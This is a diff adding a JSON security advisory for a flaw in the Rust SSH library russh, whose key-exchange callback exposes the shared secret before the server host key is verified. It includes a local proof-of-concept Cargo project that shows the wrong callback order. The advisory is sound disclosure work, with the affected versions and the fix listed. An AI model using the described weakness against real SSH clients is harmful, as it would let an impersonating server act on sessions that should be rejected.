@@ -1,0 +1,57 @@
+{
+  "id": "GHSA-9264-jvgf-6w2f",
+  "modified": "2026-11-13T19:30:05.188364651Z",
+  "published": "2026-11-13T19:20:16Z",
+  "aliases": [
+    "CVE-2026-128087"
+  ],
+  "summary": "russh kex_done: Shared-secret callback runs before server host-key verification",
+  "details": "### Summary\n\nA malicious SSH server whose host key is rejected can still cause russh's `client::Handler::kex_done()` callback to execute with the raw key-exchange shared secret. Applications using the callback for its documented protocol-bridging purpose may derive keys, initialize a secondary data channel, or perform another externally visible action before russh calls `check_server_key()` and rejects the server.\n\n### Details\n\nDuring the initial key exchange, russh calls `kex_done()` immediately after the server proves possession of the presented host key, but before the application decides whether that key belongs to the intended server:\n\n```rust\nlet shared_secret = newkeys.kex.shared_secret_bytes();\nhandler\n    .kex_done(shared_secret, \u0026newkeys.names, session)\n    .await?;\n\n// Initial KEX only checks trust afterwards.\nif let Some(certificate) = server_host_certificate {\n    if !handler.check_server_key(\u0026certificate.into()).await? {\n        return Err(crate::Error::UnknownKey.into());\n    }\n} else if let Some(server_host_key) = server_host_key {\n    let check = handler.check_server_key(\u0026server_host_key.into()).await?;\n    if !check {\n        return Err(crate::Error::UnknownKey.into());\n    }\n}\n```\n\nThis is in `russh/src/client/mod.rs` at lines 2036-2078 of commit `183a22e8f8f490fa09b6eb7bd044ef99d8c4414f`.\n\nThe API documentation describes `check_server_key()` as the important trust decision that prevents man-in-the-middle attacks. It describes `kex_done()` as the callback for deriving keys for secondary encrypted channels. The feature request that introduced the callback specifically lists VPN-over-SSH, UDP data planes, file transfer, and custom enterprise transports as intended uses.\n\nCryptographic verification of the KEX signature does not establish peer identity: an attacker operating its own SSH server can always produce a valid signature with its own host key. Identity is established only when `check_server_key()` accepts that key or certificate.\n\n### Expected behavior\n\nFor the initial key exchange, `check_server_key()` should accept the server identity before `kex_done()` exposes the shared secret for secondary-channel initialization.\n\n### Actual behavior\n\n`kex_done()` runs first. An untrusted server can therefore trigger application-defined secondary-channel actions even though `check_server_key()` subsequently rejects it with `UnknownKey`.\n\nThe callback was introduced by commit `500bef1eccc1c48ac674e2a262aa7887777431eb` and is present from `v0.55.0` through current `v0.65.0`.\n\n### Proof of concept\n\nThe following self-contained Cargo project starts a local russh server with a fresh, untrusted host key. The client models the documented bridge use case by exporting the shared secret in `kex_done()`, while `check_server_key()` rejects the server. It asserts both the failed connection and the callback order.\n\nCreate an empty directory and add `Cargo.toml`:\n\n```toml\n[package]\nname = \"russh-kex-before-host-trust-poc\"\nversion = \"0.1.0\"\nedition = \"2024\"\n\n[dependencies]\nrand = { version = \"0.10\", features = [\"thread_rng\"] }\nrussh = \"=0.65.0\"\ntokio = { version = \"1\", features = [\"macros\", \"net\", \"rt-multi-thread\"] }\n```\n\nCreate `src/main.rs`:\n\n```rust\nuse std::sync::{Arc, Mutex};\n\nuse russh::keys::{Algorithm, PrivateKey, PublicKeyOrCertificate};\nuse russh::{Names, client, server};\n\n#[derive(Clone)]\nstruct TestServer;\n\nimpl server::Handler for TestServer {\n    type Error = russh::Error;\n}\n\n#[derive(Clone)]\nstruct RejectingClient {\n    events: Arc\u003cMutex\u003cVec\u003c\u0026'static str\u003e\u003e\u003e,\n    exported_secret: Arc\u003cMutex\u003cOption\u003cVec\u003cu8\u003e\u003e\u003e\u003e,\n}\n\nimpl client::Handler for RejectingClient {\n    type Error = russh::Error;\n\n    async fn kex_done(\n        \u0026mut self,\n        shared_secret: Option\u003c\u0026[u8]\u003e,\n        _names: \u0026Names,\n        _session: \u0026mut client::Session,\n    ) -\u003e Result\u003c(), Self::Error\u003e {\n        self.events.lock().unwrap().push(\"kex_done\");\n\n        // Model a bridge exporting KEX material to a secondary protocol.\n        *self.exported_secret.lock().unwrap() = shared_secret.map(ToOwned::to_owned);\n        Ok(())\n    }\n\n    async fn check_server_key(\n        \u0026mut self,\n        _server_public_key: \u0026PublicKeyOrCertificate,\n    ) -\u003e Result\u003cbool, Self::Error\u003e {\n        self.events.lock().unwrap().push(\"check_server_key\");\n        Ok(false)\n    }\n}\n\n#[tokio::main]\nasync fn main() {\n    let mut server_config = server::Config::default();\n    server_config.inactivity_timeout = None;\n    server_config\n        .keys\n        .push(PrivateKey::random(\u0026mut rand::rng(), Algorithm::Ed25519).unwrap());\n    let server_config = Arc::new(server_config);\n\n    let listener = tokio::net::TcpListener::bind(\"127.0.0.1:0\").await.unwrap();\n    let address = listener.local_addr().unwrap();\n    tokio::spawn(async move {\n        let (stream, _) = listener.accept().await.unwrap();\n        let _ = server::run_stream(server_config, stream, TestServer).await;\n    });\n\n    let events = Arc::new(Mutex::new(Vec::new()));\n    let exported_secret = Arc::new(Mutex::new(None));\n    let client = RejectingClient {\n        events: events.clone(),\n        exported_secret: exported_secret.clone(),\n    };\n\n    let result = client::connect(\n        Arc::new(client::Config::default()),\n        address,\n        client,\n    )\n    .await;\n\n    println!(\"connection accepted: {}\", result.is_ok());\n    println!(\"callback order: {:?}\", events.lock().unwrap());\n    println!(\n        \"secret exported before rejection: {}\",\n        exported_secret.lock().unwrap().is_some()\n    );\n\n    assert!(matches!(result, Err(russh::Error::UnknownKey)));\n    assert_eq!(\n        events.lock().unwrap().as_slice(),\n        \u0026[\"kex_done\", \"check_server_key\"]\n    );\n    assert!(exported_secret.lock().unwrap().is_some());\n}\n```\n\nRun:\n\n```sh\ncargo run --quiet\n```\n\nObserved with russh `v0.65.0`:\n\n```text\nconnection accepted: false\ncallback order: [\"kex_done\", \"check_server_key\"]\nsecret exported before rejection: true\n```\n\nThe connection fails with `russh::Error::UnknownKey`, but the security-sensitive callback and its modeled external side effect have already occurred.\n\n### Impact\n\nApplications overriding `kex_done()` to bootstrap a secondary encrypted transport are affected. An unauthenticated attacker who can impersonate the SSH endpoint can complete KEX with an attacker-owned host key and trigger secondary channel initialization before that key is rejected. Depending on the bridge, this can expose early secondary-channel data or make the application act on a session established with an untrusted peer.\n\nOrdinary clients that leave `kex_done()` at its no-op default, or implementations that independently defer all callback-derived actions until host trust has been confirmed, are not affected.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "crates.io",
+        "name": "russh",
+        "purl": "pkg:cargo/russh"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0.55.0"
+            },
+            {
+              "fixed": "0.65.1"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/11/GHSA-9264-jvgf-6w2f/GHSA-9264-jvgf-6w2f.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/Eugeny/russh/security/advisories/GHSA-9264-jvgf-6w2f"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/Eugeny/russh/pull/808"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/Eugeny/russh/commit/43a46d67a80a7355fcd2fb25e7e00d79aec8184c"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/Eugeny/russh"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/Eugeny/russh/releases/tag/v0.65.1"
+    }
+  ]
+}
